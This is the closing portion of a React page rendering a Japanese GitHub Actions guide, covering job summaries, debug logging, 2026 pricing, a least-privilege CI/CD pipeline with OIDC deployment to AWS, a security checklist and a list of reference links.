                <a href="https://docs.github.com/en/actions/concepts/security/artifact-attestations" target="_blank" rel="noopener noreferrer">
                  Artifact Attestationsの概念
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/actions/security-guides/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3" target="_blank" rel="noopener noreferrer">
                  SLSA Build Level 3達成のためのガイド
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 14 ============ */}
          <section id="sec-14">
            <div className="section-head">
              <span className="section-num">14</span>
              <h2>モニタリング・デバッグ・可観測性</h2>
            </div>

            <h3>14.1 Job Summaries</h3>
            <p>
              <code>$GITHUB_STEP_SUMMARY</code>に書き込んだMarkdownは、ワークフロー実行結果のサマリーページにそのまま表示される。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>summary.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line">- <span className="prop">name</span>: Generate test summary</div>
                <div className="code-line">  <span className="kw">run</span>: |</div>
                <div className="code-line">{'    echo "## テスト結果" >> "$GITHUB_STEP_SUMMARY"'}</div>
                <div className="code-line">{'    echo "" >> "$GITHUB_STEP_SUMMARY"'}</div>
                <div className="code-line">{'    echo "| スイート | 成功 | 失敗 | スキップ |" >> "$GITHUB_STEP_SUMMARY"'}</div>
                <div className="code-line">{'    echo "|---|---|---|---|" >> "$GITHUB_STEP_SUMMARY"'}</div>
                <div className="code-line">{'    echo "| Unit | 142 | 0 | 3 |" >> "$GITHUB_STEP_SUMMARY"'}</div>
                <div className="code-line">{'    echo "| Integration | 58 | 2 | 0 |" >> "$GITHUB_STEP_SUMMARY"'}</div>
              </div>
            </div>

            <h3>14.2 ワークフローコマンド</h3>
            <p>
              <code>::notice::</code> / <code>::warning::</code> / <code>::error::</code>は、ログにアノテーションを作成し特定のファイル・行に関連付けられる。
              機密値をマスクする場合は<code>::add-mask::</code>を使う。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>annotations.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line">- <span className="prop">name</span>: Lintエラーをアノテーションとして表示</div>
                <div className="code-line">  <span className="kw">run</span>: |</div>
                <div className="code-line">    echo "::error file=src/app.ts,line=42::型エラーが検出されました"</div>
              </div>
            </div>

            <h3>14.3 デバッグロギング</h3>
            <p>
              リポジトリシークレット<code>ACTIONS_STEP_DEBUG</code>を<code>true</code>に設定するか、失敗したワークフローを
              「デバッグロギングを有効にして再実行」することで詳細なデバッグログを取得できる。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>upload-logs-on-failure.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line">- <span className="prop">name</span>: Run tests</div>
                <div className="code-line">  <span className="prop">id</span>: test</div>
                <div className="code-line">  <span className="prop">continue-on-error</span>: <span className="val">true</span></div>
                <div className="code-line">  <span className="kw">run</span>: {'npm test 2>&1 | tee test-output.log'}</div>
                <div className="code-line"></div>
                <div className="code-line">- <span className="prop">name</span>: Upload logs on failure</div>
                <div className="code-line">  <span className="kw">if</span>: <span className="val">always()</span></div>
                <div className="code-line">  <span className="kw">uses</span>: actions/upload-artifact@v4</div>
                <div className="code-line">  <span className="kw">with</span>:</div>
                <div className="code-line">    <span className="prop">name</span>: test-logs</div>
                <div className="code-line">    <span className="prop">path</span>: test-output.log</div>
                <div className="code-line">    <span className="prop">retention-days</span>: <span className="num">5</span></div>
              </div>
            </div>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands" target="_blank" rel="noopener noreferrer">
                  ワークフローコマンド
                </a>{' '}
                ·{' '}
                <a href="https://github.blog/news-insights/product-news/supercharging-github-actions-with-job-summaries/" target="_blank" rel="noopener noreferrer">
                  Job Summaries発表記事
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 15 ============ */}
          <section id="sec-15">
            <div className="section-head">
              <span className="section-num">15</span>
              <h2>コストと料金の最新動向(2026年)</h2>
            </div>

            <p>
              2026年1月1日、GitHubホスト型ランナーの料金体系が改定され、ランナーサイズによって最大39%の価格引き下げが実施された。
              この改定には、新設された1分あたり0.002ドルの「Actionsクラウドプラットフォーム料金」があらかじめ含まれている。
            </p>

            <div className="callout warn">
              <div className="callout-title">セルフホストランナー課金は延期</div>
              <p>
                一方、同時に発表されていた「2026年3月1日からセルフホストランナーにも同料金を課金する」という変更は、
                コミュニティからの強い反発を受けて<strong>延期(再評価のため一時見送り)</strong>となった。
                パブリックリポジトリでの標準ランナー利用は引き続き無料である。
              </p>
            </div>

            <h3>コスト最適化の実践ポイント</h3>
            <ul>
              <li>6章のキャッシュ戦略で不要な再ビルドを削減する。</li>
              <li>7章の<code>concurrency</code>で、古いPR実行を自動キャンセルし無駄な実行を止める。</li>
              <li>パスフィルタ(<code>paths-ignore</code>)でドキュメントのみの変更ではCIを走らせない。</li>
              <li>アーティファクトの<code>retention-days</code>を短く設定し、ストレージコストを抑える。</li>
              <li>影響を受けるパッケージのみを対象にするアフェクテッド検出で、実行対象ジョブ数自体を削減する。</li>
            </ul>

            <div className="callout info">
              <div className="callout-title">参考URL</div>
              <p>
                <a href="https://github.com/resources/insights/2026-pricing-changes-for-github-actions" target="_blank" rel="noopener noreferrer">
                  2026年GitHub Actions料金改定
                </a>{' '}
                ·{' '}
                <a href="https://github.blog/changelog/2025-12-16-coming-soon-simpler-pricing-and-a-better-experience-for-github-actions/" target="_blank" rel="noopener noreferrer">
                  セルフホストランナー課金の延期告知
                </a>{' '}
                ·{' '}
                <a href="https://docs.github.com/en/billing/reference/actions-runner-pricing" target="_blank" rel="noopener noreferrer">
                  Actionsランナー料金リファレンス
                </a>
              </p>
            </div>
          </section>

          {/* ============ SECTION 16 ============ */}
          <section id="sec-16">
            <div className="section-head">
              <span className="section-num">16</span>
              <h2>実践例: エンドツーエンドCI/CDパイプライン</h2>
            </div>

            <p>
              これまでの章で扱った要素(マトリックス・キャッシュ・OIDC・環境保護・Attestations)を組み合わせた、実務に近いパイプライン例を示す。
            </p>

            <div className="code-block">
              <div className="code-header">
                <span>.github/workflows/pipeline.yml</span>
                <span>yaml</span>
              </div>
              <div className="code-content">
                <div className="code-line"><span className="kw">name</span>: <span className="str">CI/CD Pipeline</span></div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">on</span>:</div>
                <div className="code-line">  <span className="prop">push</span>:</div>
                <div className="code-line">    <span className="prop">branches</span>: [main]</div>
                <div className="code-line">  <span className="prop">pull_request</span>:</div>
                <div className="code-line">    <span className="prop">branches</span>: [main]</div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">permissions</span>:</div>
                <div className="code-line">  <span className="prop">contents</span>: read</div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">concurrency</span>:</div>
                <div className="code-line">  <span className="prop">group</span>: pipeline-<span className="val">${'{'}{'{'} github.ref {'}'}{'}'}</span></div>
                <div className="code-line">  <span className="prop">cancel-in-progress</span>: <span className="val">true</span></div>
                <div className="code-line"></div>
                <div className="code-line"><span className="kw">jobs</span>:</div>
                <div className="code-line">  <span className="prop">test</span>:</div>
                <div className="code-line">    <span className="prop">strategy</span>:</div>
                <div className="code-line">      <span className="prop">fail-fast</span>: <span className="val">false</span></div>
                <div className="code-line">      <span className="prop">matrix</span>:</div>
                <div className="code-line">        <span className="prop">node-version</span>: [20, 22]</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">permissions</span>:</div>
                <div className="code-line">      <span className="prop">contents</span>: read</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/setup-node@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">node-version</span>: <span className="val">${'{'}{'{'} matrix.node-version {'}'}{'}'}</span></div>
                <div className="code-line">          <span className="prop">cache</span>: npm</div>
                <div className="code-line">      - <span className="kw">run</span>: npm ci</div>
                <div className="code-line">      - <span className="kw">run</span>: npm test</div>
                <div className="code-line"></div>
                <div className="code-line">  <span className="prop">build</span>:</div>
                <div className="code-line">    <span className="prop">needs</span>: test</div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">permissions</span>:</div>
                <div className="code-line">      <span className="prop">contents</span>: read</div>
                <div className="code-line">      <span className="prop">id-token</span>: write</div>
                <div className="code-line">      <span className="prop">attestations</span>: write</div>
                <div className="code-line">    <span className="prop">outputs</span>:</div>
                <div className="code-line">      <span className="prop">artifact-name</span>: dist</div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/checkout@v6</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/setup-node@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">node-version</span>: <span className="str">'22'</span></div>
                <div className="code-line">          <span className="prop">cache</span>: npm</div>
                <div className="code-line">      - <span className="kw">run</span>: {'npm ci && npm run build'}</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/upload-artifact@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">name</span>: dist</div>
                <div className="code-line">          <span className="prop">path</span>: dist/</div>
                <div className="code-line">          <span className="prop">retention-days</span>: <span className="num">14</span></div>
                <div className="code-line">      - <span className="prop">name</span>: Generate build provenance</div>
                <div className="code-line">        <span className="kw">uses</span>: actions/attest-build-provenance@v3</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">subject-path</span>: <span className="str">'dist/**'</span></div>
                <div className="code-line"></div>
                <div className="code-line">  <span className="prop">deploy</span>:</div>
                <div className="code-line">    <span className="prop">needs</span>: build</div>
                <div className="code-line">    <span className="kw">if</span>: <span className="val">github.ref == 'refs/heads/main'</span></div>
                <div className="code-line">    <span className="prop">runs-on</span>: ubuntu-latest</div>
                <div className="code-line">    <span className="prop">environment</span>:</div>
                <div className="code-line">      <span className="prop">name</span>: production</div>
                <div className="code-line">      <span className="prop">url</span>: https://example.com</div>
                <div className="code-line">    <span className="prop">permissions</span>:</div>
                <div className="code-line">      <span className="prop">contents</span>: read</div>
                <div className="code-line">      <span className="prop">id-token</span>: write   <span className="cm"># OIDC用</span></div>
                <div className="code-line">    <span className="prop">steps</span>:</div>
                <div className="code-line">      - <span className="kw">uses</span>: actions/download-artifact@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">name</span>: dist</div>
                <div className="code-line">          <span className="prop">path</span>: dist/</div>
                <div className="code-line">      - <span className="prop">name</span>: Configure AWS credentials via OIDC</div>
                <div className="code-line">        <span className="kw">uses</span>: aws-actions/configure-aws-credentials@v4</div>
                <div className="code-line">        <span className="kw">with</span>:</div>
                <div className="code-line">          <span className="prop">role-to-assume</span>: arn:aws:iam::123456789012:role/GitHubActionsDeployRole</div>
                <div className="code-line">          <span className="prop">aws-region</span>: ap-northeast-1</div>
                <div className="code-line">      - <span className="kw">run</span>: aws s3 sync dist/ s3://my-production-bucket --delete</div>
                <div className="code-line">      - <span className="prop">name</span>: Write deployment summary</div>
                <div className="code-line">        <span className="kw">run</span>: |</div>
                <div className="code-line">{'          echo "## デプロイ完了" >> "$GITHUB_STEP_SUMMARY"'}</div>
                <div className="code-line">{'          echo "- コミット: '}<span className="val">${'{'}{'{'} github.sha {'}'}{'}'}</span>{'" >> "$GITHUB_STEP_SUMMARY"'}</div>
                <div className="code-line">{'          echo "- 実行者: '}<span className="val">${'{'}{'{'} github.actor {'}'}{'}'}</span>{'" >> "$GITHUB_STEP_SUMMARY"'}</div>
              </div>
            </div>

            <div className="diagram-block">
              <div className="diagram-caption">Fig. 16-1 — エンドツーエンドパイプラインの全体像</div>
              <Mermaid chart={DIAGRAM_16_1} />
            </div>

            <p>
              このパイプラインは、テスト→ビルド→(承認を伴う)デプロイという典型的な流れの中に、最小権限の
              パーミッション設定・OIDCによるキーレス認証・ビルド来歴の証明・環境保護ルールを組み込んだ構成になっている。
            </p>
          </section>

          {/* ============ SECTION 17 ============ */}
          <section id="sec-17">
            <div className="section-head">
              <span className="section-num">17</span>
              <h2>まとめ: プロダクションレディ・チェックリスト</h2>
            </div>

            <ul className="checklist">
              <li>
                <span className="box"></span>
                <span>ワークフロー全体の<code>permissions</code>をread-only(または<code>{'{}'}</code>)にし、必要なジョブにのみ権限を追加しているか</span>
              </li>
              <li>
                <span className="box"></span>
                <span>サードパーティアクションはフルコミットSHAでピン留めし、Dependabotで更新を自動化しているか</span>
              </li>
              <li>
                <span className="box"></span>
                <span><code>pull_request_target</code>を使う場合、フォークのコードを明示的にチェックアウトしていないか(または権限分離パターンに再設計したか)</span>
              </li>
              <li>
                <span className="box"></span>
                <span>クラウド認証はOIDCベースの短命トークンに移行し、長期アクセスキーを避けているか</span>
              </li>
              <li>
                <span className="box"></span>
                <span>本番デプロイに対応するEnvironmentにRequired Reviewers・デプロイブランチ制限を設定しているか</span>
              </li>
              <li>
                <span className="box"></span>
                <span>セルフホストランナーをパブリックリポジトリで使っていないか、Runner Groupsで信頼境界を分離しているか</span>
              </li>
              <li>
                <span className="box"></span>
                <span>リリース成果物にArtifact Attestations(ビルド来歴)を付与しているか</span>
              </li>
              <li>
                <span className="box"></span>
                <span>キャッシュキーに依存関係ファイルのハッシュを含め、<code>concurrency</code>で無駄な実行を抑止しているか</span>
              </li>
              <li>
                <span className="box"></span>
                <span>失敗時のログ・アーティファクトを保存し、Job SummaryとGitHub CLIでの調査導線を整えているか</span>
              </li>
              <li>
                <span className="box"></span>
                <span>コストの前提(料金・無料枠)は必ずGitHub公式の最新情報で確認しているか</span>
              </li>
            </ul>
          </section>

          {/* ============ SECTION 18 ============ */}
          <section id="sec-18">
            <div className="section-head">
              <span className="section-num">18</span>
              <h2>参考資料</h2>
            </div>

            <p>本ガイドの各項目は、以下の一次情報源・信頼できる技術情報源を参照して作成した。</p>

            <div className="ref-group">
              <h4>GitHub公式ドキュメント・ブログ</h4>
              <ul className="ref-list">
                <li>
                  <span className="ref-label">GitHub Actions ドキュメントトップ</span>
                  <a href="https://docs.github.com/en/actions" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions
                  </a>
                </li>
                <li>
                  <span className="ref-label">GitHub Actionsを理解する</span>
                  <a href="https://docs.github.com/en/actions/get-started/understand-github-actions" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/get-started/understand-github-actions
                  </a>
                </li>
                <li>
                  <span className="ref-label">クイックスタート</span>
                  <a href="https://docs.github.com/en/actions/get-started/quickstart" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/get-started/quickstart
                  </a>
                </li>
                <li>
                  <span className="ref-label">ワークフローとアクションの概念</span>
                  <a href="https://docs.github.com/en/actions/concepts/workflows-and-actions/workflows" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/concepts/workflows-and-actions/workflows
                  </a>
                </li>
                <li>
                  <span className="ref-label">ワークフロー構文リファレンス</span>
                  <a href="https://docs.github.com/actions/using-workflows/workflow-syntax-for-github-actions" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/actions/using-workflows/workflow-syntax-for-github-actions
                  </a>
                </li>
                <li>
                  <span className="ref-label">ワークフロー・アクションのリファレンス全体</span>
                  <a href="https://docs.github.com/en/actions/reference/workflows-and-actions" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/reference/workflows-and-actions
                  </a>
                </li>
                <li>
                  <span className="ref-label">ワークフローの再利用</span>
                  <a href="https://docs.github.com/en/actions/concepts/workflows-and-actions/reusing-workflow-configurations" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/concepts/workflows-and-actions/reusing-workflow-configurations
                  </a>
                </li>
                <li>
                  <span className="ref-label">トリガーイベント一覧</span>
                  <a href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows
                  </a>
                </li>
                <li>
                  <span className="ref-label">並行実行・マトリックスの例</span>
                  <a href="https://docs.github.com/en/actions/examples/using-concurrency-expressions-and-a-test-matrix" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/examples/using-concurrency-expressions-and-a-test-matrix
                  </a>
                </li>
                <li>
                  <span className="ref-label">デプロイと環境</span>
                  <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments
                  </a>
                </li>
                <li>
                  <span className="ref-label">環境を使ったデプロイ管理</span>
                  <a href="https://docs.github.com/actions/deployment/targeting-different-environments/using-environments-for-deployment" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/actions/deployment/targeting-different-environments/using-environments-for-deployment
                  </a>
                </li>
                <li>
                  <span className="ref-label">デプロイ制御</span>
                  <a href="https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/control-deployments" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/how-tos/deploy/configure-and-manage-deployments/control-deployments
                  </a>
                </li>
                <li>
                  <span className="ref-label">GITHUB_TOKENの権限制御</span>
                  <a href="https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/controlling-permissions-for-github_token
                  </a>
                </li>
                <li>
                  <span className="ref-label">リポジトリのActions設定管理</span>
                  <a href="https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository
                  </a>
                </li>
                <li>
                  <span className="ref-label">OpenID Connect概念</span>
                  <a href="https://docs.github.com/en/actions/concepts/security/openid-connect" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/concepts/security/openid-connect
                  </a>
                </li>
                <li>
                  <span className="ref-label">クラウドプロバイダーでのOIDC設定</span>
                  <a href="https://docs.github.com/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-cloud-providers
                  </a>
                </li>
                <li>
                  <span className="ref-label">OIDCリファレンス(Enterprise Cloud)</span>
                  <a href="https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/oidc" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/enterprise-cloud@latest/actions/reference/security/oidc
                  </a>
                </li>
                <li>
                  <span className="ref-label">セキュアな利用リファレンス</span>
                  <a href="https://docs.github.com/en/actions/reference/security/secure-use" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/reference/security/secure-use
                  </a>
                </li>
                <li>
                  <span className="ref-label">pull_request_targetを安全に使う</span>
                  <a href="https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target
                  </a>
                </li>
                <li>
                  <span className="ref-label">Artifact Attestationsの概念</span>
                  <a href="https://docs.github.com/en/actions/concepts/security/artifact-attestations" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/concepts/security/artifact-attestations
                  </a>
                </li>
                <li>
                  <span className="ref-label">ビルド来歴のためのArtifact Attestations</span>
                  <a href="https://docs.github.com/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/actions/security-for-github-actions/using-artifact-attestations-to-establish-provenance-for-builds
                  </a>
                </li>
                <li>
                  <span className="ref-label">SLSA Build Level 3達成のためのガイド</span>
                  <a href="https://docs.github.com/actions/security-guides/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/actions/security-guides/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3
                  </a>
                </li>
                <li>
                  <span className="ref-label">ワークフローコマンド</span>
                  <a href="https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands
                  </a>
                </li>
                <li>
                  <span className="ref-label">Actionsランナー料金リファレンス</span>
                  <a href="https://docs.github.com/en/billing/reference/actions-runner-pricing" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://docs.github.com/en/billing/reference/actions-runner-pricing
                  </a>
                </li>
                <li>
                  <span className="ref-label">GitHub Actions製品ページ(日本語)</span>
                  <a href="https://github.com/features/actions?locale=ja" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.com/features/actions?locale=ja
                  </a>
                </li>
                <li>
                  <span className="ref-label">attest-build-provenanceアクション</span>
                  <a href="https://github.com/actions/attest-build-provenance" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.com/actions/attest-build-provenance
                  </a>
                </li>
                <li>
                  <span className="ref-label">Job Summaries発表記事</span>
                  <a href="https://github.blog/news-insights/product-news/supercharging-github-actions-with-job-summaries/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.blog/news-insights/product-news/supercharging-github-actions-with-job-summaries/
                  </a>
                </li>
                <li>
                  <span className="ref-label">GITHUB_TOKENデフォルト権限変更の告知</span>
                  <a href="https://github.blog/changelog/2023-02-02-github-actions-updating-the-default-github_token-permissions-to-read-only/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.blog/changelog/2023-02-02-github-actions-updating-the-default-github_token-permissions-to-read-only/
                  </a>
                </li>
                <li>
                  <span className="ref-label">pull_request_targetのcheckout保護強化</span>
                  <a href="https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout/
                  </a>
                </li>
                <li>
                  <span className="ref-label">過剰な権限を検出するツールの紹介</span>
                  <a href="https://github.blog/security/new-tool-to-secure-your-github-actions/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.blog/security/new-tool-to-secure-your-github-actions/
                  </a>
                </li>
                <li>
                  <span className="ref-label">2026年GitHub Actions料金改定</span>
                  <a href="https://github.com/resources/insights/2026-pricing-changes-for-github-actions" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.com/resources/insights/2026-pricing-changes-for-github-actions
                  </a>
                </li>
                <li>
                  <span className="ref-label">セルフホストランナー課金の延期告知</span>
                  <a href="https://github.blog/changelog/2025-12-16-coming-soon-simpler-pricing-and-a-better-experience-for-github-actions/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.blog/changelog/2025-12-16-coming-soon-simpler-pricing-and-a-better-experience-for-github-actions/
                  </a>
                </li>
                <li>
                  <span className="ref-label">GitHub for Beginners: Actions入門</span>
                  <a href="https://github.blog/developer-skills/github/github-for-beginners-getting-started-with-github-actions/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.blog/developer-skills/github/github-for-beginners-getting-started-with-github-actions/
                  </a>
                </li>
                <li>
                  <span className="ref-label">GitHub Security Lab: Pwn Requestsを防ぐ</span>
                  <a href="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/
                  </a>
                </li>
              </ul>
            </div>

            <div className="ref-group">
              <h4>セキュリティベンダー・技術記事(信頼できる二次情報源)</h4>
              <ul className="ref-list">
                <li>
                  <span className="ref-label">Sysdig: セルフホストランナーをバックドアとして悪用する手口</span>
                  <a href="https://www.sysdig.com/blog/how-threat-actors-are-using-self-hosted-github-actions-runners-as-backdoors" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://www.sysdig.com/blog/how-threat-actors-are-using-self-hosted-github-actions-runners-as-backdoors
                  </a>
                </li>
                <li>
                  <span className="ref-label">Sysdig: MITRE・Splunk等で見つかった安全でないGitHub Actions</span>
                  <a href="https://www.sysdig.com/blog/insecure-github-actions-found-in-mitre-splunk-and-other-open-source-repositories" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://www.sysdig.com/blog/insecure-github-actions-found-in-mitre-splunk-and-other-open-source-repositories
                  </a>
                </li>
                <li>
                  <span className="ref-label">Wiz: GitHub Actionsハードニングガイド</span>
                  <a href="https://www.wiz.io/blog/github-actions-security-guide" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://www.wiz.io/blog/github-actions-security-guide
                  </a>
                </li>
                <li>
                  <span className="ref-label">Orca Security: pull_request_nightmare Part 1</span>
                  <a href="https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://orca.security/resources/blog/pull-request-nightmare-github-actions-rce/
                  </a>
                </li>
                <li>
                  <span className="ref-label">Orca Security: pull_request_nightmare Part 2</span>
                  <a href="https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://orca.security/resources/blog/pull-request-nightmare-part-2-exploits/
                  </a>
                </li>
                <li>
                  <span className="ref-label">Spotipy社のセキュリティアドバイザリ(pull_request_target実例)</span>
                  <a href="https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-h25v-8c87-rvm8" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-h25v-8c87-rvm8
                  </a>
                </li>
                <li>
                  <span className="ref-label">再利用可能なワークフローと複合アクションの組織運用に関するコミュニティ議論</span>
                  <a href="https://github.com/orgs/community/discussions/171037" target="_blank" rel="noopener noreferrer" className="ref-url">
                    https://github.com/orgs/community/discussions/171037
                  </a>
                </li>
              </ul>
            </div>

            <footer className="page-footer">
              GitHub Actions 中級〜上級者向け完全ガイド · QA_Studies
            </footer>
          </section>
        </main>
      </div>
    </div>
  );
}
